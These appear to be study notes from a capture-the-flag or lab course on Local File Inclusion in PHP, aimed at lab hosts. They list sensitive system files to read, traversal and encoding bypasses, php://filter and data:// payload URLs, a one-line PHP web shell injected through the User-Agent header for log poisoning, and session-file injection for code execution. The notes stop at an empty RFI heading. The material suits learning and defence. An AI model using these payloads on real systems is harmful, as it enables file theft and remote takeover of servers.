LFI (Local File Inclusion)

	What is LFI?
		-> LFI (local file inclusion) is a vulnerability which an attacker can exploit to include/read files.
	Why this happens?
		-> LFI occurs when an application uses the path to a file as input. If the application treats this input as trusted, a local file may be used in the include statement.

	An LFI vulnerability is found in various web applications. As an example, in the PHP, the following functions cause this kind of vulnerability:

    	1. include
    	2. require
    	3. include_once 
    	4. require_once

	Example:
		-> http://vhost.thm/lfi.php?page=home.html
		-> http://vhost.thm/lfi.php?page=/etc/passwd

	Vulnerable code: $local_file = $_REQUEST["page"];

	Important files worth looking for:
		/etc/issue
		/etc/passwd
		/etc/shadow
		/etc/group
		/etc/hosts
		/etc/motd
		/etc/mysql/my.cnf
		/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
		/proc/self/environ
		/proc/version
		/proc/cmdline

	Bypassing filters using ....//.
	URL encoding techniques (such as double encoding)

	LFI using Directory traversal
		-> Directory traversal or Path traversal is an HTTP attack which allows attackers to access restricted directories and execute commands outside of the web server's root diectory or other paths.

		Example:
			-> http://vhost.thm/lfi.php?page=../../../../etc/passwd

		Vulnerable code: $local_file = "html/".$_REQUEST["page"];

	PHP Filter:
		1. http://example.thm.labs/page.php?file=filter/read=string.rot13/resource=/etc/passwd 
		2. http://example.thm.labs/page.php?file=php://filter/convert.base64-encode/resource=/etc/passwd

	PHP Data
		The PHP wrapper is used to include raw plain text or base64 encoded data. It is used to include images on the current page. It is being used in LFI exploit. 
		http://example.thm.labs/page.php?file=data://text/plain;base64,QW9DMyBpcyBmdW4hCg==

	Reaching RCE using LFI and log poisoning

		What is Log poisoning?
			-> Log Poisoning is a common technique used to gain a reverse shell from a LFI vulnerability. To make it work an attacker attempts to inject malicious input to the server log.
			Note: In order for this to happen, the directory should have read and execute permissions.

		-> Try to read /var/log/apache2/access.log
		-> Intercept the request to this page in burp and inject php code in User agent field.
			User-Agent: Mozilla/5.0 <?php system($_GET['lfi']); ?> Firefox/70.0
			->This php command will allow us to execute system commands by parsing the input to a GET parameter called lfi.
		-> Now you can upload an php reverse shell and through vulnerable lfi parameter execute the php file and you 	will get the shell back.

	Important cheat sheets:
		https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
		https://highon.coffee/blog/lfi-cheat-sheet/


	LFI to RCE via PHP sessions
		->  PHP sessions are files within the operating system that store temporary information. After the user logs out of the web application, the PHP session information will be deleted.
		-> This technique requires enumeration to read the PHP configuration file first, and then we know where the PHP sessions files are. Then, we include a PHP code into the session and finally call the file via LFI.
		->  PHP stores session data in files within the system in different locations based on the configuration. The following are some of the common locations that the PHP stores in:
			c:\Windows\Temp
			/tmp/
			/var/lib/php5
			/var/lib/php/session
		-> Once the attacker finds where PHP stores the session file and can control the value of their session, the attacker can use it to a chain exploit with an LFI to gain remote command execution.
		-> If we enumerate and read the PHP configuration of the vulnerable web application we provided, we can see that it stores the PHP sessions into the /tmp directory.
		->  It also stores the value of the username into the session even if you are not logged in since this value is needed by the developer to use it in the logs function. We inject the PHP code into the user section in the following figure, stored in the PHP session file.

			username: <?php phpinfo(); ?>
			password: abcd

		-> To find the PHP session file name, PHP, by default uses the following naming scheme, sess_<SESSION_ID> where we can find the SESSION_ID using the browser and verifying cookies sent from the server.
		-> 

RFI (Remote File Inclusion)
	

